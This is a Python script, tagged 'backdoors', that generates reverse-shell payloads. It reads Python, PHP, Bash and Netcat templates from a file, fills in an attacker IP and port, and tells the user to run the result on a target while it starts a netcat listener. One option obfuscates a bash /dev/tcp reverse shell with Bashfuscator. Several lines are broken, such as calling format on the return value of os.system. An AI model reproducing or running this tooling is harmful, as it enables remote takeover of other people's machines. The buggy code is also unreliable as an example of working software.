#!/usr/bin/python3

#FIXED: make ip address variable to be treated as string

"""
Author: Skiddyfruit
Version: 1.0
License: MIT-3.0
Category: backdoors
"""

"""
requirements:

1. Git
2. python3 python3-pip python3-argcomplete xclip
- sudo apt-get install python3 python3-pip python3-argcomplete xclip xsel
"""
import ifaddr # Fetching ip from interface
import socket
import netifaces as ifaces
import re 
import os 
import linecache # for reading specific lines



adapters = ifaddr.get_adapters()

for adapter in adapters:
    print("IPs of network adapter " + adapter.nice_name)
    for ip in adapter.ips:
        print(ip.ip, "\n")

ip = str(input("HOST IP:\n"))
port = str(input("PORT:\n"))
#shell = str(input("Please select an option?\n"))
def full():
    print("Welcome, let's generate a reverse shell of your choice\n")
    global ip
    global port
    
    print("please select language and shell option:\n\n [1] - python (Alphanumeric reverse shell)\n\n [2] - PHP(Alphanumeric reverse shell)\n\n [3] - Bash(Reverse shell)\n\n [4] - Netcat(Reverse shell) \n\n\nAdvanced:\n\n [5] - Bash(obfuscated bash reverse shell)\n\n  ")
    
    selection = input("Type in a choosen number:\t\n")
    
    if int(selection) == 1:
        with open("myshells.txt", "r") as shells:
            #for myreplace in (("[ip]", ip), ("[port]", port)):
            fetchshell = linecache.getline('myshells.txt', 1)
            ipreplaced = fetchshell.replace("[ip]", '"{}"').format(ip)
            #print(ipreplaced.replace("[port]", '"{}"')).format(port)

            print("Run the following payload on target: \n")
            print(ipreplaced.replace("[port]", port), "\n")
            print("starting Listener:\n")
            os.system(str("netcat -nvlp {}").format(port))

    elif int(selection) == 2:
        with open("myshells.txt", "r") as shells:
            #for myreplace in (("[ip]", ip), ("[port]", port)):
            fetchshell = linecache.getline('myshells.txt', 2)
            ipreplaced = fetchshell.replace("[ip]", '"{}"').format(ip)
            #print(ipreplaced.replace("[port]", '"{}"')).format(port)

            print("Run the following payload on target: \n")
            print(ipreplaced.replace("[port]", port), "\n")
            print("starting Listener:\n")
            os.system(str("netcat -nvlp {}").format(port))

    elif int(selection) == 3:
            with open("myshells.txt", "r") as shells:
                #for myreplace in (("[ip]", ip), ("[port]", port)):
                fetchshell = linecache.getline('myshells.txt', 3)
                ipreplaced = fetchshell.replace("[ip]", ip)
                #print(ipreplaced.replace("[port]", '"{}"')).format(port)
                            
                print("Run the following payload on target: \n")
                print(ipreplaced.replace("[port]", port), "\n")
                print("starting Listener:\n")
                os.system(str("netcat -nvlp {}").format(port))
    elif int(selection) == 4:
            with open("myshells.txt", "r") as shells:
                #for myreplace in (("[ip]", ip), ("[port]", port)):
                fetchshell = linecache.getline('myshells.txt', 4)
                ipreplaced = fetchshell.replace("[ip]", ip)
                #print(ipreplaced.replace("[port]", '"{}"')).format(port)
                        
                print("Run the following payload on target: \n")
                print(ipreplaced.replace("[port]", port), "\n")
                print("starting Listener:\n")
                os.system(str("netcat -nvlp {}").format(port))

    elif int(selection) == 5:
                #os.system("cd ~")
                #os.system("git clone https://github.com/Bashfuscator/Bashfuscator;cd Bashfuscator;python3 setup.py install --user;cd /bashfuscator/bin")
                if os.path.exists("~/Bashfuscator") == True:
                    finalpayload = os.system("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
                    print(finalpayload, end=" ")
                #print("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(ip, port))
                elif os.path.exists("~/Bashfuscator") == False:
                    os.system("cd ~")
                    os.system("git clone https://github.com/Bashfuscator/Bashfuscator;cd Bashfuscator;python3 setup.py install --user;cd /bashfuscator/bin")
                    finalpayload = os.system("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
                    print(finalpayload, end=" ")
                    os.system(str("netcat -nvlp {}").format(port))

full()


